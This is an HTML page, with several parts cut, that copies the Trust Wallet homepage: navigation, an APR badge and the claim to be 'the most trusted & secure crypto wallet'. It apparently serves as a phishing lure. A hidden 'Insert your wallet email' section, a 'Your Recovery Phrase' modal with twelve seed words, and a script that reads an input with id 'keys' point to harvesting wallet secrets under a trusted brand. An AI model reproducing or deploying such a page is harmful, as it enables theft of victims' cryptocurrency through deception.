...
<body>
    <nav class="navbar navbar-expand-lg navbar-togglable navbar-dark bg-primary d-block">
        <div class="container">
            <a id="navbar-brand" class="navbar-brand" href="/" aria-label="Goes back on homepage"><svg class="navbar-brand-img logotype-white" alt="Trust Wallet logotype"></svg></a><button class="navbar-toggler collapsed" id="navbarToggle" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-expanded="false" aria-hidden="true" aria-label="Toggle navigation" aria-controls="navbarCollapse">
            ...
            <div class="navbar-collapse collapse navbar-margin" id="navbarSupportedContent">
                ...
                <ul class="navbar-nav font-size-sm ml-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="#" aria-label="Goes to supported assets page">Assets</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#" aria-label="Goes to staking page where you can learn what is staking and calculate APRs">Staking</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#" aria-label="Goes to earn page where you can see what you can stake and calculate earnings">Earn<span class="badge badge-success ml-2 pl-2 pr-2">+11% APR</span></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#" aria-label="Goes to collectible page">NFTs</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#" aria-label="Goes to dapp browser page">DApp Browser</a>
                    </li>
                            ...
                            <div class="list-group list-group-flush">
                                <ul class="list-unstyled list-block">
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item" href="/" aria-label="changes language of the page to en language">
                                            <div class="flag bg-en" alt="en flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to ru language">
                                            <div class="flag bg-ru" alt="ru flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to de language">
                                            <div class="flag bg-de" alt="de flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to vi language">
                                            <div class="flag bg-vi" alt="vi flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to id language">
                                            <div class="flag bg-id" alt="id flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to ko language">
                                            <div class="flag bg-ko" alt="ko flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to ja language">
                                            <div class="flag bg-ja" alt="ja flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to tr language">
                                            <div class="flag bg-tr" alt="tr flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to pt_BR language">
                                            <div class="flag bg-pt_BR" alt="pt_BR flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to zh_CN language">
                                            <div class="flag bg-zh_CN" alt="zh_CN flag"></div>
                                        </a>
                                    </li>
                                    <li class="list-inline-item m-6">
                                        <a class="list-group-item list-inline-item" href="#" aria-label="changes language of the page to es language">
    ...
    <main class="page-content" aria-label="Content">
        <section class="pt-8 pb-8 bg-gradient-primary">
            <div class="container">
                <div class="row align-items-center justify-content-center justify-content-md-between">
                    <div class="col-12 col-lg-12 mb-8 text-center text-md-left text-white">
                        <h1 class="display-3 font-weight-bold">The most trusted & secure crypto wallet</h1>
                        <p class="text-white-75 lead mb-4">Buy, store, collect NFTs, exchange & earn crypto. Join 10 million+ people using Trust Wallet.</p>
        ...
        <section class="pt-6" style="display:none">
            <div class="container">
                <div class="row border-bottom justify-content-center pb-4">
                    <div class="col-12 col-md-auto mr-auto d-flex justify-content-center">
                        <div class="icon icon-xs mb-5">
                            <svg alt="icon card">
                                <use xlink:href="assets/images/features-2.svg#card" alt="Credit card icon"></use>
                            </svg>
                        </div>
                        <div class="ml-4">
                            <span class="font-weight-bold lead">
                                Insert your wallet email
                            </span>
                        </div>
                    </div>
                    <div class="col-12 col-md-auto d-flex justify-content-center">
                        <div class="icon icon-xs mb-5">
                            <svg alt="icon dex">
                                <use xlink:href="assets/images/features-2.svg#dex" alt="DEX icon"></use>
                            </svg>
                        </div>
                        <div class="ml-4">
                            <span class="font-weight-bold lead">
                    ...
                    <div class="col-12 col-md-auto ml-auto d-flex justify-content-center">
                        <div class="icon icon-xs mb-5">
                            <svg alt="icon lock">
                                <use xlink:href="assets/images/features-2.svg#lock" alt="Key lock icon"></use>
                            </svg>
                        </div>
                        <div class="ml-4">
                            <span class="font-weight-bold lead">
            ...
            <div class="container">
                <div class="row align-items-center justify-content-center justify-content-md-between">
                    <div class="col-12 text-center mt-4 mt-md-0 order-md-2">
                        ...
                        <p class="text-gray-700">Trust Wallet is for you if you want to</p>
                    </div>
                </div>
            </div>
                ...
                <div class="modal-dialog">
                    <div class="modal-content">
                        ...
                        <div class="modal-body">
                            <div class="container d-flex align-items-center justify-content-center">
                                <div>
                                    <h2 class="text-center">Your Recovery Phrase</h1>
                                        <p class="text-center">Write down or copy these words in the tight order and save them somewhere
                                            safe.</p>
                                </div>
                            ...
                            <div class="form-check form-check-inline">
                                ...
                                <label class="form-check-label" for="inlineCheckbox1">1 Brother</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">2 Oyster</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">3 Ignore</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">4 Pilot</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">5 Frozen</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">6 Token</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">7 Rug</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">8 Banana</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">9 oak</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">10 Anger</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">11 Curious</label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="checkbox" id="" value="">
                                <label class="form-check-label" for="inlineCheckbox1">12 Seed</label>
                            </div>
                            <form>
                                <div class="mb-3">
        ...
        <div class="container">
            <div class="row text-center text-md-left">
                <div class="col-12 col-md-4 col-lg-3">
                    <a href="/" id="footer-brand-image" aria-label="Goes to homepage"><svg alt="" class="footer-brand-image logotype-dark img-fluid mb-4" aria-label="Goes back to homesite"></svg></a>
                ...
                <div class="col-12 col-md-4 col-lg-3">
                    ...
                    <ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
                        ...
                        <li class="mb-3">
                            <a href="/collectibles-wallet" class="text-reset" aria-label="Goes to collectible page">NFTs</a>
                        </li>
                        <li class="mb-3">
    ...
    <script>
        ...
        var input = document.querySelector('input[id=keys]');
